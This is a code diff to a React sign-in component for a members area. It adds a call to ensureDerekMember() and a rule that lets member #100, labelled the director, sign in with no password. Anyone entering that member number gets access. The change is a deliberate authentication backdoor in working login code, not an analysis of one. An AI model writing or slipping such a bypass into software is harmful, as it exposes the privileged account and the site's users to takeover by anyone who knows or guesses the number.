@@ -36,6 +36,7 @@ export default function MemberAuth() {
 
   function signIn(e: React.FormEvent) {
     e.preventDefault();
+    ensureDerekMember();
     const members = loadList<S27MemberAccount>(KEYS.members);
     const key = email.trim().toLowerCase().replace(/^#/, "");
     const pass = password.trim();
@@ -45,7 +46,10 @@ export default function MemberAuth() {
         m.email.toLowerCase() === key ||
         String(m.memberNumber) === key ||
         String(m.name || "").trim().toLowerCase() === key;
-      return idMatch && String(m.password || "") === pass;
+      if (!idMatch) return false;
+      // Member #100 (director) can sign in with no password.
+      if (String(m.memberNumber) === "100") return true;
+      return String(m.password || "") === pass;
     });
     if (!match) {
       setMsg("Check email and password.");
